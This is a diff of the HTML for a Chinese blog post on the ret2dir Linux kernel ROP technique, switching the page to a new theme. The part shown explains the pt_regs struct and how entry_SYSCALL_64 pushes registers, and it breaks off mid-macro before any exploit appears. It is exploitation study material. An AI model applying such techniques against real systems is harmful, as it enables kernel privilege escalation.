@@ -1,482 +1,697 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.2">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="论如何逐渐偏离主题：ret2dir看不懂→看内存相关源码解析→想调试看页表初始化→找不到入口从BIOS开始调试→调试到页表初始化结束→终于结束了开始ret2dir 感觉干了几天跟没干一样，但确实对内存映射有了实感，勉强算一种收获吧（以后再也不钻牛角尖了我发誓╥﹏╥…）">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="论如何逐渐偏离主题：ret2dir看不懂→看内存相关源码解析→想调试看页表初始化→找不到入口从BIOS开始调试→调试到页表初始化结束→终于结束了开始ret2dir 感觉干了几天跟没干一样，但确实对内存映射有了实感，勉强算一种收获吧（以后再也不钻牛角尖了我发誓╥﹏╥…）">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Kernel ROP ret2dir">
 <meta property="og:url" content="http://akaieurus.github.io/2023/08/10/kernel-ROP-ret2dir/index.html">
 <meta property="og:site_name" content="Eurus禁止摆烂！">
 <meta property="og:description" content="论如何逐渐偏离主题：ret2dir看不懂→看内存相关源码解析→想调试看页表初始化→找不到入口从BIOS开始调试→调试到页表初始化结束→终于结束了开始ret2dir 感觉干了几天跟没干一样，但确实对内存映射有了实感，勉强算一种收获吧（以后再也不钻牛角尖了我发誓╥﹏╥…）">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://akaieurus.github.io/2023/08/10/kernel-ROP-ret2dir/gdb1.png">
-<meta property="og:image" content="http://akaieurus.github.io/2023/08/10/kernel-ROP-ret2dir/gdb2.png">
-<meta property="og:image" content="http://akaieurus.github.io/2023/08/10/kernel-ROP-ret2dir/gdb3.png">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc24.jpg">
 <meta property="article:published_time" content="2023-08-10T15:10:59.000Z">
-<meta property="article:modified_time" content="2023-08-16T10:51:43.880Z">
+<meta property="article:modified_time" content="2024-01-29T11:19:26.619Z">
 <meta property="article:author" content="Eurus">
 <meta property="article:tag" content="kernel">
 <meta property="article:tag" content="ROP">
 <meta property="article:tag" content="ret2dir">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://akaieurus.github.io/2023/08/10/kernel-ROP-ret2dir/gdb1.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc24.jpg">
+  
+  
+  
+  <title>Kernel ROP ret2dir - Eurus禁止摆烂！</title>
 
-<link rel="canonical" href="http://akaieurus.github.io/2023/08/10/kernel-ROP-ret2dir/">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'en'
-  };
-</script>
 
-  <title>Kernel ROP ret2dir | Eurus禁止摆烂！</title>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
 
 
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
 
 
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
 
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+<body>
+  
 
-</head>
+  <header>
+    
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Eurus禁止摆烂！</h1>
-      <span class="logo-line-after"><i></i></span>
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
     </a>
-      <p class="site-subtitle" itemprop="description">In a world of locked rooms, the man with the key is king.</p>
-  </div>
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
-
-  </li>
-  </ul>
 </nav>
 
+  
 
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc24.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Kernel ROP ret2dir"></span>
+          
+        </div>
 
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-10 23:10" pubdate>
+          2023年8月10日 晚上
+        </time>
+      </span>
+    
+  </div>
 
-</div>
-    </header>
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          712 字
+        
+      </span>
+    
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          6 分钟
+        
+      </span>
+    
+
+    
+    
   </div>
 
 
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://akaieurus.github.io/2023/08/10/kernel-ROP-ret2dir/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Eurus">
-      <meta itemprop="description" content="本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Eurus禁止摆烂！">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          Kernel ROP ret2dir
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-08-10 23:10:59" itemprop="dateCreated datePublished" datetime="2023-08-10T23:10:59+08:00">2023-08-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-08-16 18:51:43" itemprop="dateModified" datetime="2023-08-16T18:51:43+08:00">2023-08-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/kernel/" itemprop="url" rel="index"><span itemprop="name">kernel</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/kernel/ROP/" itemprop="url" rel="index"><span itemprop="name">ROP</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+        
+      </div>
 
       
-        <p>论如何逐渐偏离主题：ret2dir看不懂→看内存相关源码解析→想调试看页表初始化→找不到入口从BIOS开始调试→调试到页表初始化结束→终于结束了开始ret2dir</p>
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Kernel ROP ret2dir</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>论如何逐渐偏离主题：ret2dir看不懂→看内存相关源码解析→想调试看页表初始化→找不到入口从BIOS开始调试→调试到页表初始化结束→终于结束了开始ret2dir</p>
 <p>感觉干了几天跟没干一样，但确实对内存映射有了实感，勉强算一种收获吧（以后再也不钻牛角尖了我发誓╥﹏╥…）</p>
 <span id="more"></span>
 
 <p>先说明一下一个用到的结构体pt_regs</p>
 <h2 id="pt-regs"><a href="#pt-regs" class="headerlink" title="pt_regs"></a>pt_regs</h2><p>pt_regs结构体如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> bp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> bx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ax;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> cx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> dx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> si;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> di;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> orig_ax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ip;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> sp;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pt_regs</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span><br><span class="hljs-comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span><br><span class="hljs-comment"> */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bp;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bx;<br><span class="hljs-comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ax;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cx;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> dx;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> si;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> di;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span><br><span class="hljs-comment"> * On hw interrupt, it&#x27;s IRQ number:</span><br><span class="hljs-comment"> */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> orig_ax;<br><span class="hljs-comment">/* Return frame for iretq */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ip;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cs;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sp;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ss;<br><span class="hljs-comment">/* top of stack page */</span><br>&#125;;<br></code></pre></td></tr></table></figure>
 
 <p>在进行系统调用之前会把寄存器入栈，入栈的结构和pt_regs相符（是正着的）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">SYM_CODE_START(entry_SYSCALL_64)</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	swapgs</span><br><span class="line">	/* tss.sp2 is scratch space. */</span><br><span class="line">	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)</span><br><span class="line">	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp</span><br><span class="line">	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)</span><br><span class="line"></span><br><span class="line">	/* Construct struct pt_regs on stack */</span><br><span class="line">	pushq	$__USER_DS				/* pt_regs-&gt;ss */</span><br><span class="line">	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	/* pt_regs-&gt;sp */</span><br><span class="line">	pushq	%r11					/* pt_regs-&gt;flags */</span><br><span class="line">	pushq	$__USER_CS				/* pt_regs-&gt;cs */</span><br><span class="line">	pushq	%rcx					/* pt_regs-&gt;ip */</span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)</span><br><span class="line">	pushq	%rax					/* pt_regs-&gt;orig_ax */</span><br><span class="line"></span><br><span class="line">	PUSH_AND_CLEAR_REGS rax=$-ENOSYS</span><br><span class="line"></span><br><span class="line">	/* IRQs are off. */</span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	movq	%rsp, %rsi</span><br><span class="line">	call	do_syscall_64		/* returns with IRQs disabled */</span><br><span class="line">		……</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SYM_CODE_START(entry_SYSCALL_64)<br>	UNWIND_HINT_EMPTY<br><br>	swapgs<br>	/* tss.sp2 is scratch space. */<br>	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)<br>	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp<br>	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp<br><br>SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)<br><br>	/* Construct struct pt_regs on stack */<br>	pushq	$__USER_DS				/* pt_regs-&gt;ss */<br>	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	/* pt_regs-&gt;sp */<br>	pushq	%r11					/* pt_regs-&gt;flags */<br>	pushq	$__USER_CS				/* pt_regs-&gt;cs */<br>	pushq	%rcx					/* pt_regs-&gt;ip */<br>SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)<br>	pushq	%rax					/* pt_regs-&gt;orig_ax */<br><br>	PUSH_AND_CLEAR_REGS rax=$-ENOSYS<br><br>	/* IRQs are off. */<br>	movq	%rax, %rdi<br>	movq	%rsp, %rsi<br>	call	do_syscall_64		/* returns with IRQs disabled */<br>		……<br></code></pre></td></tr></table></figure>
 
 <p>有一部分压栈操作在PUSH_AND_CLERT_REGS宏里</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.macro PUSH_AND_CLEAR_REGS rdx=%rdx rax=%rax save_ret=<span class="number">0</span></span><br><span class="line">	.<span class="keyword">if</span> \save_ret</span><br><span class="line">	pushq	%rsi		<span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">	movq	<span class="number">8</span>(%rsp), %rsi	<span class="comment">/* temporarily store the return address in %rsi */</span></span><br><span class="line">	movq	%rdi, <span class="number">8</span>(%rsp)	<span class="comment">/* pt_regs-&gt;di (overwriting original return address) */</span></span><br><span class="line">	.<span class="keyword">else</span></span><br><span class="line">	pushq   %rdi		<span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">	pushq   %rsi		<span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">	.endif</span><br><span class="line">	pushq	\rdx		<span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">	pushq   %rcx		<span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">	pushq   \rax		<span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">	pushq   %r8		<span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">	pushq   %r9		<span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">	pushq   %r10		<span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">	pushq   %r11		<span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">	pushq	%rbx		<span class="comment">/* pt_regs-&gt;rbx */</span></span><br><span class="line">	pushq	%rbp		<span class="comment">/* pt_regs-&gt;rbp */</span></span><br><span class="line">	pushq	%r12		<span class="comment">/* pt_regs-&gt;r12 */</span></span><br><span class="line">	pushq	%r13		<span class="comment">/* pt_regs-&gt;r13 */</span></span><br><span class="line">	pushq	%r14		<span class="comment">/* pt_regs-&gt;r14 */</span></span><br><span class="line">	pushq	%r15		<span class="comment">/* pt_regs-&gt;r15 */</span></span><br><span class="line">	UNWIND_HINT_REGS</span><br><span class="line">        